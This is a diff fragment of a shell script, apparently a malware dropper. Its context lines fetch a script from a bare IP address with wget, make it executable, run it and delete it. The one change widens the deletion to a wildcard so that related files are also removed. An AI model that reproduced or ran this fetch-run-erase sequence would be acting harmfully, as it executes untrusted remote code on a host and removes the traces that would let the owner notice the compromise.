@@ -8,5 +8,5 @@
 wget 162.243.173.234/LadyClareSE1.sh
 chmod +x LadyClareSE1.sh
 ./LadyClareSE1.sh
-rm LadyClareSE1.sh -f
+rm LadyClareSE1* -f
 
